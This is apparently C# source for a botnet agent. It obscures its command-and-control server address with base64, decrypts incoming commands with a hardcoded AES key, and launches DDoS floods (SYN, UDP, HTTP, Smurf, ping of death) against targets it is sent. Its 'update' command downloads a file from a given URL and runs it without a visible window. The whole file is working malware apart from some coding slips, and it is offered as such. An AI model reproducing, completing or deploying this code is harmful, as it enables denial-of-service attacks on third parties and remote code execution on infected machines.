using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Security;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Diagnostics;
using System.Threading;
namespace Botnet_C2_Bypass
{
    public class Connecting
    {

        public static byte[] key = new byte[] { 86, 244, 118, 56, 12, 153, 142, 189, 217, 43, 230, 122, 112, 220, 54, 179, 145, 63, 114, 99, 163, 22, 229, 245, 222, 224, 137, 26, 80, 65, 80, 57 };
        public static byte[] IV = new byte[] { 241, 85, 43, 57, 244, 140, 73, 5, 70, 60, 51, 176, 119, 149, 255, 38 };
        public bool isConnecting = true;
        static string iPServer = "MTAzLjY3LjE5OS44Mg==";
        static byte[] getBase64toString = Convert.FromBase64String(iPServer);
        public static string IPServer = Encoding.UTF8.GetString(getBase64toString);
        public const int port = 57365;

        public static async Task Connect()
        {
            Task waitCommand = Task.Run(async () =>
            {
                IPGlobalProperties ipProperties = IPGlobalProperties.GetIPGlobalProperties();
                TcpConnectionInformation[] tcpConnections = ipProperties.GetActiveTcpConnections();
                var endPoint = tcpConnections.FirstOrDefault()?.LocalEndPoint;
                string vicip = endPoint.Address.ToString();
                string vicPort = endPoint.Port.ToString();
                if (vicPort != null || vicip != null)
                {
                    string tcpConnectionString = $"MyIP {vicip} {vicPort}";
                    string plaintext = tcpConnectionString;     
                }
                IPAddress ipa = IPAddress.Parse(IPServer);
                IPEndPoint ipe = new IPEndPoint(ipa, port);
                TcpListener listen = new TcpListener(ipe);
                while (true)
                {
                    listen.Start();
                    TcpClient client = listen.AcceptTcpClient();
                    NetworkStream stream = client.GetStream();
                    if (client.Connected)
                    {
                        string responseData = null;
                        using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
                        {
                            byte[] buffer = new byte[1024];
                            aes.Key = key;
                            aes.IV = IV;
                            aes.BlockSize = IV.Length;
                            aes.KeySize = key.Length;
                            aes.Mode = CipherMode.ECB;
                            ICryptoTransform trans = aes.CreateDecryptor();
                            ICryptoTransform decryptDatas = aes.CreateDecryptor(aes.Key, aes.IV);
                            using (CryptoStream cs = new CryptoStream(stream, decryptDatas, CryptoStreamMode.Read))
                            {
                                cs.Read(buffer, 0, buffer.Length);
                                responseData = Encoding.UTF8.GetString(buffer);
                            }
                        }

                        string[] parts = responseData.Split(new char[] { ' ' });
                        if (parts[0] == "DnsFlood")
                        {
                            if (parts[1] != null || parts[2] != null || parts[3] != null)
                            {
                                string target = parts[1];
                                int thread = Int32.Parse(parts[2]);
                                int time = Int32.Parse(parts[3]);
                            }
                        }
                        if (parts[0] == "PingOfDeath")
                        {
                            if (parts[1] != null || parts[2] != null || parts[3] != null)
                            {
                                string target = parts[1];
                                int thread = Int32.Parse(parts[2]);
                                int time = Int32.Parse(parts[3]);
                                await DDoS.PingOfDeath(target, time, thread);
                            }
                        }
                        if (parts[0] == "SmurfAttack")
                        {
                            if (parts[1] != null || parts[2] != null || parts[3] != null)
                            {
                                string target = parts[1];
                                int thread = Int32.Parse(parts[2]);
                                int time = Int32.Parse(parts[3]);
                                await DDoS.SendSmurf(target, time, thread);
                            }
                        }
                        if (parts[0] == "TCPFloodWithData")
                        {
                            if (parts[1] != null || parts[2] != null || parts[3] != null || parts[4] != null)
                            {
                                string target = parts[1];
                                int port = Int32.Parse(parts[2]);
                                int thread = Int32.Parse(parts[3]);
                                int time = Int32.Parse(parts[4]);
                                int length = Int32.Parse(parts[5]);
                                await DDoS.SendTcp(target, port, time, thread,length);
                            }
                        }
                        if (parts[0] == "HTTPPostFlood")
                        {
                            if (parts[1] != null || parts[2] != null || parts[3] != null)
                            {
                                string target = parts[1];
                                int port = Int32.Parse(parts[2]);
                                int thread = Int32.Parse(parts[3]);
                                int time = Int32.Parse(parts[4]);
                                await DDoS.HttpPost(target, time, thread);
                            }
                        }
                        if (parts[0] == "HTTPGetFlood")
                        {
                            if (parts[1] != null || parts[2] != null || parts[3] != null)
                            {
                                string target = parts[1];
                                int thread = Int32.Parse(parts[3]);
                                int time = Int32.Parse(parts[4]);
                                await DDoS.HttpGet(target, time, thread);
                            }
                        }
                        if (parts[0] == "SYNFlood")
                        {
                            if (parts[1] != null || parts[2] != null || parts[3] != null || parts[4] != null)
                            {
                                string target = parts[1];
                                int port = Int32.Parse(parts[2]);
                                int thread = Int32.Parse(parts[3]);
                                int time = Int32.Parse(parts[4]);
                                await DDoS.SendSyn(target, port, time, thread);
                            }
                        }
                        if (parts[0] == "UdpFlood")
                        {
                            if (parts[1] != null || parts[2] != null || parts[3] != null)
                            {
                                string target = parts[1];
                                int port = Int32.Parse(parts[2]);
                                int thread = Int32.Parse(parts[3]);
                                int time = Int32.Parse(parts[4]);
                                int length = Int32.Parse(parts[5]);
                                await DDoS.SendUdp(target, port, time, thread,length);
                            }
                        }

                        if (parts[0] == "update")
                        {
                            string url = parts[1];
                            using (HttpClient httpClient = new HttpClient())
                            {
                                HttpResponseMessage response = await httpClient.GetAsync(url);
                                if (response.IsSuccessStatusCode)
                                {
                                    string filename = Path.GetFileName(url);
                                    string filepath = Path.Combine(Environment.CurrentDirectory, filename);

                                    Stream streams = await response.Content.ReadAsStreamAsync();
                                    using (FileStream fileStream = new FileStream(filepath, FileMode.Create))
                                    {
                                        await streams.CopyToAsync(fileStream);
                                    }
                                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                                    processStartInfo.FileName = filepath;
                                    processStartInfo.CreateNoWindow = true;
                                    processStartInfo.UseShellExecute = false;
                                    Process process = new Process();
                                    process.StartInfo = processStartInfo;
                                    process.Start();
                                }
                            }
                        }
                    }
                }
            });
            await Task.WhenAll(waitCommand);
        }
    }
}


